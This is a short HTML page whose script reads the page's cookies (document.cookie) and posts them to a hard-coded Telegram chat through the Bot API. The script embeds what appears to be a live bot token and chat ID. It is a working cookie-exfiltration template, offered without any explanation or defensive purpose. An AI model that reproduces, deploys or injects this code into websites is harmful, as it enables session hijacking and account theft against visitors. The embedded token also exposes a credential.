<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Send Cookies to Telegram</title>
</head>
<body>
  <button onclick="sendCookies()">Send Cookies to Telegram</button>

  <script>
    async function sendCookies() {
      const cookies = document.cookie;

      const telegramBotToken = '7597541879:AAGlAMmsEL0rZLFqs5G2j0_mi2yr3k-_w4o'; // e.g. 123456789:ABCdefGhIjKlmNoPQRstuVwxYZ
      const chatId = '1389313310'; // e.g. @yourchannelusername or numeric ID
      const message = `Cookies: ${cookies}`;

      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });

      if (response.ok) {
        alert('Cookies sent to Telegram!');
      } else {
        alert('Failed to send cookies.');
      }
    }
  </script>
</body>
</html>
